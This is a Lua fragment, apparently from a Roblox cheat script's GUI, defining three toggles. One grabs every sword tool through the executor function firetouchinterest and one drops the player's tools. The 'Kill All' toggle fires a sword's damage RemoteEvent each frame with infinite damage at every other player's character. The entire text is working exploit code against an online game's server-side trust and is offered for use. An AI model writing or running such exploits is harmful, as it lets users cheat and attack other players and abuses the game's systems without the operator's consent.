-- === TOGGLES TAB ===
local ToggleSection = TogglesTab:NewSection("Automation & Toggles")
TogglesTab:NewToggle("Grab All Tools", false, function(state)
    _G.grabTools = state
    task.spawn(function()
        while _G.grabTools do
            local char = game.Players.LocalPlayer.Character
            if char and char:FindFirstChild("HumanoidRootPart") then
                for _, obj in pairs(workspace:GetDescendants()) do
                    if obj:IsA("Tool") and obj.Name == "sword" and obj:FindFirstChild("Handle") and obj.Handle:FindFirstChildOfClass("TouchTransmitter") then
                        firetouchinterest(char.HumanoidRootPart, obj.Handle, 0); task.wait(); firetouchinterest(char.HumanoidRootPart, obj.Handle, 1)
                    end
                end
            end
            task.wait(0.1)
        end
    end)
end)
TogglesTab:NewToggle("Drop Tools", false, function(bool)
    if bool then
        for _, tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
            if tool:IsA("Tool") then tool.CanBeDropped, tool.Parent, tool.Parent = true, game.Players.LocalPlayer.Character, workspace end
        end
    end
end)
TogglesTab:NewToggle("Kill All", false, function(state)
    if _G.killAllConnection then _G.killAllConnection:Disconnect(); _G.killAllConnection = nil end
    if state then
        _G.killAllConnection = game:GetService("RunService").Heartbeat:Connect(function()
            local player = game.Players.LocalPlayer
            local sword = player.Character and (player.Character:FindFirstChild("sword") or player.Backpack:FindFirstChild("sword"))
            local dmg = sword and sword.Handle and sword.Handle:FindFirstChild("dmg") and sword.Handle.dmg.RemoteEvent
            if not dmg then return end
            for _, p in pairs(game:GetService("Players"):GetPlayers()) do
                if p ~= player and p.Character then
                    local h = p.Character:FindFirstChild("Humanoid")
                    if h and h.Health > 0 then pcall(dmg.FireServer, dmg, h, math.huge) end
                end
            end
        end)
    end
end)

